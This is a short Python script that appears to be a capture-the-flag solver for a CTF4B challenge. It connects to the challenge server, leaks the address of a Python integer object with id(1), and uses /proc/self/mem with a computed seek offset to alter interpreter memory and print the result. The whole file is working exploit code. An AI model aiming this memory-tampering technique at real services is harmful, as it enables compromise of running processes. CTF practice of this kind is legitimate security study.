import os
import socket

HOST = os.getenv("CTF4B_HOST", "0.0.0.0")
PORT = os.getenv("CTF4B_PORT", "27182")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, int(PORT)))

s.recv(128) #Chance: 
s.send(b"id(1)\n")
id_1 = int(s.recv(128).decode().replace("\nFile:", "")) #XXXXX\nFile: 
print(id_1)
s.send(b"/proc/self/mem\n")
s.recv(128) #Seek: 
id_42 = id_1 + 41*32 + 24
print(id_42)
s.send(str(id_42).encode()+b"\n")

print(s.recv(128).decode(), end="")

s.close()